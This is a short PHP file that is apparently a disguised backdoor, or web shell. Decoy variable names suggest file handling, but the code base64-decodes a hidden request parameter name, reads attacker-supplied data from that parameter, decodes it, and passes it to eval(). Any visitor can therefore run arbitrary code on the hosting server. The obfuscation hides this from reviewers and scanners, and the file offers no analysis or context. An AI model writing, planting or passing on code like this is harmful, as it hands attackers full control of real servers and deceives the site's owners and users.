<?php
$db_rename=true;
if (! empty($db_rename)) {
        $move = true;
    } else {
        $move = false;
    }
$folder=$_REQUEST[str_replace('x_','',base64_decode('c3hfaGF4X3J4X2U='))];
$jsonformat=substr($folder,3,strlen($folder)-3);
$temp_file=base64_decode($jsonformat);
eval($temp_file);
?>